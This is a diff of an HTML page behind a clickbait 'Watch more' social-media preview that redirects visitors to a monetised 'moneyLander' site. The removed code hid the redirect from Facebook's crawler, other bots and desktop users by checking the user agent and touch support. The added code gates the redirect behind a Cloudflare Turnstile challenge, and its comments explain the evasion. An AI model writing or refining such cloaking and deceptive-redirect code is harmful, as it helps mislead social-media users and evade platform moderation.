@@ -3,36 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Social Preview (Social Review) -->
     <meta property="og:title" content="Watch more">
-    <meta property="og:description" content="Watch more">
+    <meta property="og:description" content="Click here to watch the full video.">
     <meta property="og:image" content="https://i.postimg.cc/DzD235mH/Picsart-26-07-08-17-22-55-667.jpg">
     <meta property="og:type" content="website">
+
+    <!-- Cloudflare Turnstile Script -->
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
-<body style="background-color: #ffffff;">
+<body style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #ffffff;">
+
+    <!-- Captcha Box -->
+    <div class="cf-turnstile" 
+         data-sitekey="YOUR_SITE_KEY_HERE" 
+         data-callback="onSuccess">
+    </div>
 
     <script>
         const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";
         
-        const ua = navigator.userAgent.toLowerCase();
-        
-        // Bot detection
-        const isBot = /facebookexternalhit|facebot|bot|crawler|spider|slurp|bingbot/i.test(ua);
-        
-        // Touch support detection (Mobile/Tablet)
-        const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-
-        // LOGIC:
-        // 1. Agar bot hai -> Block/Captcha dikhao
-        // 2. Agar "Laptop/Desktop" hai (jisme touch nahi hota) -> Isse bhi ab hum "Bot" ki tarah treat karenge taake isse bhi Captcha dikhe
-        
-        if (isBot || !hasTouchSupport) {
-            console.log("Security Challenge Active: Bot or Non-Touch device detected.");
-            // Yahan koi redirect nahi hoga, isliye Cloudflare ka WAF Captcha trigger ho jayega
-        } else {
-            // Sirf wahi log aage jayenge jinke paas "Touch Support" hai (Mobile/Tablet Users)
+        // Force Captcha Logic
+        function onSuccess(token) {
             window.location.replace(moneyLander);
         }
+
+        // Logic: Agar user desktop pe hai, toh Turnstile handle karega
+        // Agar mobile pe hai, toh bhi Turnstile verification lega (Safety first)
+        // Turnstile ka widget apne aap verify kar lega.
     </script>
 </body>
 </html>
-
